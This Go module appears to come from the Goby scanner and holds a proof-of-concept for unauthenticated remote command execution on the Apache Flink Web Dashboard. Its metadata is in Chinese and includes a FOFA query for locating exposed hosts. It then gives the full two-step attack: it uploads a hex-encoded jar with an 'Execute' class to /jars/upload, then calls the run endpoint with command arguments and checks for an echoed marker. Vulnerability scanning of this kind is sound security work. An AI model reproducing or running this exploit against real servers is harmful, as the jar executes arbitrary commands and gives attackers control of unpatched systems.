package exploits

import "git.gobies.org/goby/goscanner/goutils"

func init() {
	expJson := `{
    "Name": "Apache Flink 未授权访问远程命令执行",
    "Description": "Apache Flink 是一个分布式大数据处理引擎,可对有限数据流和无限数据流进行有状态计算。由于Apache Flink Dashboard默认没有用户权限认证。攻击者通过未授权的Flink Dashboard控制台，直接上传木马jar包，可远程执行任意系统命令获取服务器权限，风险极大。",
    "Product": "APACHE-Flink",
    "Homepage": "https://flink.apache.org/",
    "DisclosureDate": "2019-11-18",
    "Author": "laowang0521@qq.com",
    "FofaQuery": "(title=\"Apache Flink Web Dashboard\" || body=\"<img alt=\\\"Apache Flink Dashboard\\\" src=\\\"images/flink-logo.png\")",
    "Level": "3",
    "CveID": "",
    "Tags": [
        "命令执行"
    ],
    "VulType": [
        "命令执行"
    ],
    "Impact": "<p>攻击者通过未授权的Flink Dashboard控制台，直接上传木马jar包，可远程执行任意系统命令获取服务器权限，风险极大。</p>",
    "Recommendation": "<p>1、添加身份验证，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、请关注Apache Flink官方更新，及时升级至最新版本：<a href=\"http://www.example.com\">https://flink.apache.org/</a></p><p>3、禁止外网访问该系统，或者确保防火墙设置白名单只对可信端点开放。</p>",
    "References": [
        "https://fofa.so/"
    ],
    "HasExp": false,
    "ExpParams": [],
    "is0day": false,
    "ExpTips": {
        "type": "Tips",
        "content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/jars/upload",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0",
                    "Accept": "application/json, text/plain, */*",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Accept-Encoding": "gzip, deflate",
                    "Content-Type": "multipart/form-data; boundary=---------------------------1234",
                    "Origin": "http://{{{host}}}",
                    "Connection": "close",
                    "Referer": "http://{{{host}}}/"
                },
                "data_type": "hexstring",
                "data": "2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d313233340d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d226a617266696c65223b2066696c656e616d653d226e6f6e616d652e6a6172220d0a436f6e74656e742d547970653a206170706c69636174696f6e2f6f637465742d73747265616d0d0a0d0a504b030414000808080022756d4f000000000000000000000000140004004d4554412d494e462f4d414e49464553542e4d46feca0000f34dcccb4c4b2d2ed10d4b2d2acecccfb35230d433e0e5f24dccccd375ce492c2eb65270ad484d2e2d49e5e5e2e50200504b0708888a08bf300000002e000000504b03040a000008000022756d4f000000000000000000000000090000004d4554412d494e462f504b030414000808080022756d4f0000000000000000000000000d000000457865637574652e636c6173738d55eb76135514fe4e32c94c26432f93425b1005d492b6a4b1888a2d22500a56425b49ad06f032991e93d32633612e34d50afa10fee813f0cb1fa82b71d1a50fc043b1dc6768d3d286b54cd6ec7dcedefbdbb7b3cfccf317cffe0530895f75bc83cb1a3ed57045c7555cd391c28c86eb92cfaab8a1e2a686cf34cce9d0f0b9865b2a0a1a6eebe8c1bc240b1a16a5ea0b15777414b1a463005f6a5896fc2b49be96a424c9dd1445b8a7e2be8e9332e837927f2bc9773abe87a5a2acc266485e128e082e33c4b3a3cb0cca8cbbc2197a0bc2e1f361bdccbd25ab5c238959706dabb66c7942ee77844a50153e43aa30dbe47618f06912d52de1301ccbde2bac5a0fad7ccd722af962e009a7322d03b006c3f17daa45cfb5b9ef5f0b456d857be420de083664b84368f26d79150a97e9e29a1cbb84b5eb2bb492368743481bbba3090351cb176dcb71a2a8fa6cd3e68d40b88eaf827ce84537f46c7e43c8328d9df22624d2c0bb18610083eafa138e55e72ab8811f50315085a024d6856360156b0c43afab93a1ef6009e48fb29fe04d0a18cbdb324c8e64f9b270f27e95928800c2cdbfcc291529ca965f959635037550db633902baa01ef71faa52c503031e7c691f90e9fdab06423c34b00ecab70961600323067ec44f0c8307d3eb241edfbcb26960133f1b7804a1e2b1815f50a34c779af44a690be5556e53b0cc9ea8d3e8577bb0e107bcce90aef0805ad5e09e9c82916c9721ea76f8e9c02db8ebdc9bb17c4a6020dbd548b35d27a0e9a4f138b1dff14cd5f28afc41c81d9b4f8fde6538da2d2ccd6e9237851ff8d15d21b3841f585e20cd47bb4e5bff2121430fd537e734c280dc728b0a1edc05d3c9ee53107c28db55211331429f5fe7355117813c92b3af6fd3813157ab963fcf9b94b4e2442c61d75cd9b2b81bca4a3a1117c9c95e2a49abd1e00e5d8bdcff3a90bdcbac05eeee7467bab8a6f80db9c369bc4def46f98bd1c5a20b46f42cedf2c4e9ae2131d6067b1aa9b3449391906194a8f1d2006318279ec239e4c88ac06c89ec9224fbcb8c15c6e2e76f9bf1bfa1b49030932da85b38b50dad94fc07a952dcd48b25c54c174b8973c5368cf927b8601e9952b6d153327bdbe86ba17f0baad92b45bb98614562cc0e26d74246ea074ac314e4681bc7ccc11686a612c3891686b79096fcf81328e305b93af107ded8c6c9521b6f9a6fb5706a9c9e68d1c2e916ceecd5fa218e108dd35f814af50c12bd40755e848e9b48e316e9397ab1863eba90fdf80d26fe4426eacd1dfa584c1272821a1927440eefd15e913dc179bc1ff97d4ade26e5db0cbfe3035ac5c8dbc20e620d7314ff23423c227e111f539fa708a590fd343d97a22c3ff90f504b0708410e9ca5d6030000e2060000504b0102140014000808080022756d4f888a08bf300000002e0000001400040000000000000000000000000000004d4554412d494e462f4d414e49464553542e4d46feca0000504b01020a000a000008000022756d4f0000000000000000000000000900000000000000000000000000760000004d4554412d494e462f504b0102140014000808080022756d4f410e9ca5d6030000e20600000d000000000000000000000000009d000000457865637574652e636c617373504b05060000000003000300b8000000ae0400000000000000000000000000000000000000000000000000000000000d0a2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d313233342d2d0d0a"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "not contains",
                        "value": "Unable to load requested file /jar/upload.",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "success",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "jar|lastbody|regex|flink-web-upload/(.*?)\\.jar"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/jars/{{{jar}}}.jar/run?entry-class=Execute&program-args=%22echo+1cca676950dfbab0c08b0f9b2fc5ed4c%22",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0",
                    "Accept": "application/json, text/plain, */*",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Accept-Encoding": "gzip, deflate",
                    "Content-Type": "application/json;charset=utf-8",
                    "Origin": "http://{{{host}}}",
                    "Connection": "close",
                    "Referer": "http://{{{host}}}/"
                },
                "data_type": "text",
                "data": "{\"entryClass\":\"Execute\",\"programArgs\":\"\\\"echo 1cca676950dfbab0c08b0f9b2fc5ed4c\\\"\"}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "1cca676950dfbab0c08b0f9b2fc5ed4c",
                        "bz": "youlookbeautiful | md5sum"
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Posttime": "2019-11-22 21:59:36",
    "fofacli_version": "3.10.7",
    "fofascan_version": "0.1.16",
    "status": "2",
    "CNNVD": [],
    "CNVD": [],
    "CVSS": "9.8",
    "GobyQuery": "(title=\"Apache Flink Web Dashboard\" || body=\"<img alt=\\\"Apache Flink Dashboard\\\" src=\\\"images/flink-logo.png\")",
    "PocId": "10708"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
